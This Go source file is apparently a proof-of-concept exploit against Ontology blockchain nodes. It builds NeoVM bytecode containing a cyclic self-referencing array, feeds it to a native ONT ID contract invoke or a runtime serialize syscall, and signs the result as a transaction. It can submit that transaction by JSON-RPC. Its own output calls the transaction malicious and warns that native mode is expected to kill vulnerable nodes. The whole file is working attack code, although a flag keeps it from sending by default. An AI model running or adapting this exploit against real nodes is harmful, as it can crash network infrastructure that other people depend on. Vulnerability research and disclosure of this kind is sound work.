package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"time"

	"github.com/ontio/ontology-crypto/keypair"
	"github.com/ontio/ontology/account"
	"github.com/ontio/ontology/common"
	"github.com/ontio/ontology/core/payload"
	"github.com/ontio/ontology/core/signature"
	"github.com/ontio/ontology/core/types"
	"github.com/ontio/ontology/vm/neovm"
)

const (
	nativeInvokeName     = "Ontology.Native.Invoke"
	runtimeSerializeName = "System.Runtime.Serialize"
)

var ontIDContractAddress = []byte{
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x03,
}

type rpcRequest struct {
	JSONRPC string        `json:"jsonrpc"`
	Method  string        `json:"method"`
	Params  []interface{} `json:"params"`
	ID      int           `json:"id"`
}

type rpcResponse struct {
	JSONRPC string          `json:"jsonrpc"`
	Error   int64           `json:"error"`
	Desc    string          `json:"desc"`
	Result  json.RawMessage `json:"result"`
	ID      int             `json:"id"`
}

func emitCyclicArray(builder *neovm.ParamsBuilder) {
	builder.EmitPushInteger(big.NewInt(0))
	builder.Emit(neovm.NEWARRAY)        // A
	builder.Emit(neovm.DUP)             // A, A
	builder.Emit(neovm.TOALTSTACK)      // A ; alt A
	builder.EmitPushBool(false)         // A, false
	builder.Emit(neovm.APPEND)          // A = [false]
	builder.Emit(neovm.DUPFROMALTSTACK) // A
	builder.Emit(neovm.DUPFROMALTSTACK) // A, A
	builder.Emit(neovm.APPEND)          // A = [false, A]
}

func buildCycleCode(mode string) []byte {
	builder := neovm.NewParamsBuilder(new(bytes.Buffer))
	emitCyclicArray(builder)
	builder.Emit(neovm.DUPFROMALTSTACK)

	switch mode {
	case "native":
		builder.EmitPushByteArray([]byte("regIDWithPublicKey"))
		builder.EmitPushByteArray(ontIDContractAddress)
		builder.EmitPushInteger(big.NewInt(0))
		builder.Emit(neovm.SYSCALL)
		builder.EmitPushByteArray([]byte(nativeInvokeName))
	case "runtime":
		builder.Emit(neovm.SYSCALL)
		builder.EmitPushByteArray([]byte(runtimeSerializeName))
	default:
		panic("unknown mode")
	}

	return builder.ToArray()
}

func buildSignedRaw(code []byte) (rawHex string, txHash string, signer string, err error) {
	acc := account.NewAccount("")
	tx := &types.MutableTransaction{
		TxType:   types.InvokeNeo,
		Nonce:    uint32(time.Now().UnixNano()),
		GasPrice: 0,
		GasLimit: 200000000,
		Payload:  &payload.InvokeCode{Code: code},
	}

	tx.Payer = acc.Address
	hash := tx.Hash()
	sigData, err := signature.Sign(acc, hash.ToArray())
	if err != nil {
		return "", "", "", err
	}
	tx.Sigs = []types.Sig{{
		PubKeys: []keypair.PublicKey{acc.PublicKey},
		M:       1,
		SigData: [][]byte{sigData},
	}}

	immutable, err := tx.IntoImmutable()
	if err != nil {
		return "", "", "", err
	}
	return common.ToHexString(immutable.ToArray()), immutable.Hash().ToHexString(), acc.Address.ToBase58(), nil
}

func rpcCall(endpoint, method string, params []interface{}) ([]byte, error) {
	body, err := json.Marshal(rpcRequest{
		JSONRPC: "2.0",
		Method:  method,
		Params:  params,
		ID:      1,
	})
	if err != nil {
		return nil, err
	}
	resp, err := http.Post(endpoint, "application/json", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	out, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var parsed rpcResponse
	if err := json.Unmarshal(out, &parsed); err == nil && parsed.Error != 0 {
		return out, fmt.Errorf("rpc %s returned error %d desc=%s result=%s", method, parsed.Error, parsed.Desc, string(parsed.Result))
	}
	return out, nil
}

func main() {
	endpoint := flag.String("endpoint", "http://127.0.0.1:20336", "Ontology JSON-RPC endpoint")
	mode := flag.String("mode", "native", "payload mode: native or runtime")
	preexec := flag.Bool("preexec", true, "send with sendrawtransaction pre-exec flag")
	send := flag.Bool("send", false, "actually submit the transaction to the endpoint")
	flag.Parse()

	if *mode != "native" && *mode != "runtime" {
		fmt.Fprintln(os.Stderr, "mode must be native or runtime")
		os.Exit(2)
	}

	code := buildCycleCode(*mode)
	rawHex, txHash, signer, err := buildSignedRaw(code)
	if err != nil {
		fmt.Fprintf(os.Stderr, "build transaction failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("mode=%s\n", *mode)
	fmt.Printf("signer_address=%s\n", signer)
	fmt.Printf("malicious_hash=%s raw_len=%d code_len=%d\n", txHash, len(rawHex)/2, len(code))
	fmt.Printf("raw_tx=%s\n", rawHex)

	if !*send {
		fmt.Println("not_sent=true")
		fmt.Println("warning=rerun with --send only against a disposable local/regtest node; --mode=native is expected to kill vulnerable nodes")
		return
	}

	params := []interface{}{rawHex}
	if *preexec {
		params = append(params, 1)
	}
	out, err := rpcCall(*endpoint, "sendrawtransaction", params)
	if err != nil {
		fmt.Printf("trigger_rpc_error=%v\n", err)
	} else {
		fmt.Printf("trigger_rpc_response=%s\n", string(out))
	}

	out, err = rpcCall(*endpoint, "getblockcount", []interface{}{})
	if err != nil {
		fmt.Printf("post_trigger_getblockcount_error=%v\n", err)
		return
	}
	fmt.Printf("post_trigger_getblockcount_response=%s\n", string(out))
}
